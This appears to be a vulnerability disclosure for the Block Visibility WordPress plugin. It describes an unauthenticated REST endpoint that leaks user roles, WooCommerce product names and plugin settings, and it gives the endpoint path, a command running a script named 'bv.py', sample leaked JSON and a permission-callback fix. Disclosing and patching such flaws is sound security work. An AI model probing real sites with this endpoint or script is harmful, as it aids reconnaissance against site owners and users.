## 🔐 Unauthenticated Metadata Disclosure in Block Visibility Plugin

Title:
Unauthenticated Metadata Disclosure via REST API in Block Visibility Plugin

Summary:
A vulnerability was discovered in the Block Visibility – Conditional Visibility Control for the Block Editor plugin (tested on version 3.7.1), which exposes sensitive internal configuration data via a publicly accessible REST API endpoint:

  GET /wp-json/block-visibility/v1/variables

This endpoint is accessible without authentication due to an insecure permission callback, allowing any remote attacker to retrieve:

- Full list of registered user roles (including custom roles from plugins like WooCommerce, Timetics, Eventin, etc.)
- WooCommerce product metadata (IDs and names)
- Integration states (EDD, ACF, WP Fusion)
- Plugin settings (including plugin version and admin settings page URL)

This exposure can assist in reconnaissance, targeted attacks, and crafting access control bypasses.

## Usage:
An unauthenticated user can access the endpoint directly using tools like curl, a browser, or any HTTP client to retrieve structured JSON data from:

  https://targetsite.com/wp-json/block-visibility/v1/variables

No authentication, nonce, or permission check is required. The data returned may include custom business logic, product groupings, or user segmentation that can aid in exploitation or information gathering.

## Mitigation:
Plugin developers should apply proper access control by updating the REST API route registration to restrict access to authenticated users only. For example:

  'permission_callback' => function () {
      return current_user_can('edit_posts');
  }

Additionally, plugin responses should avoid disclosing sensitive data (like full product labels or role names) unless explicitly required by a validated user action.

## Command
python3 bv.py https://targetsite.com/

## Output 
{
  "plugin_variables": {
    "version": "3.7.1",
    "settings_url": "https://targetsite.com/wp-admin/options-general.php?page=block-visibility-settings"
  },
  "is_full_control_mode": false,
  "is_pro": false,
  "current_users_roles": null,
  "integrations": {
    "acf": {
      "active": false,
      "fields": []
    },
    "edd": {
      "active": false,
      "products": []
    },
    "woocommerce": {
      "active": true,
      "products": [
        {
          "value": 231,
          "label": "Dalpark Primary"
        },
        {
          "value": "231_232",
          "label": "Dalpark Primary - EP"
        },
        {
          "value": "231_233",
          "label": "Dalpark Primary - LP"
        }
      ]
    },
    "wp_fusion": {
      "active": false,
      "tags": [],
      "exclude_admins": false
    }
  },
  "user_roles": [
    { "value": "administrator", "label": "Administrator", "type": "core" },
    { "value": "editor", "label": "Editor", "type": "core" },
    { "value": "author", "label": "Author", "type": "core" },
    { "value": "contributor", "label": "Contributor", "type": "core" },
    { "value": "subscriber", "label": "Subscriber", "type": "core" },
    { "value": "customer", "label": "Customer", "type": "custom" },
    { "value": "shop_manager", "label": "Shop manager", "type": "custom" },
    { "value": "timetics-staff", "label": "Staff", "type": "custom" },
    { "value": "timetics-customer", "label": "Timetics Customer", "type": "custom" },
    { "value": "etn-speaker", "label": "Eventin Speaker", "type": "custom" },
    { "value": "etn-organizer", "label": "Eventin Organizer", "type": "custom" },
    { "value": "etn-customer", "label": "Eventin Customer", "type": "custom" },
    { "value": "logged-out", "label": "None (Logged-out users)", "type": "core" }
  ]
}
## Discovered by: Mrj Haxcore

